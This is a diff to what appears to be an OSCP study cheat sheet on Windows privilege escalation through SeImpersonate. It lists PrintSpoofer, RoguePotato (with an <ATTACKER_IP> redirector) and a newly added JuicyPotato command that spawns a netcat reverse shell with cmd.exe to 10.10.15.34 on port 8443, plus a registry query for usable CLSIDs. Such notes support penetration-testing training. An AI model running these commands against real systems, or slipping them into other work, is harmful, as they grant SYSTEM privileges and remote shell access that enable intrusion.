@@ -74,6 +74,8 @@ net localgroup administrators
 **Decision point (SeImpersonate found — most common OSCP win):**
 
 ```powershell
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+
 # PrintSpoofer (best first try)
 .\PrintSpoofer64.exe -i -c cmd
 
@@ -84,6 +86,16 @@ net localgroup administrators
 
 # RoguePotato (needs external redirector)
 .\RoguePotato.exe -r <ATTACKER_IP> -e "cmd.exe /c whoami" -l 9999
+```
+
+**Juicy Potato:**
+
+```sh
+reg query HKCR\CLSID /s /f LocalService
+```
+
+```sh
+.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\Users\Public\nc.exe 10.10.15.34 8443 -e cmd.exe" -t * -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}"
 ```
 
 ---
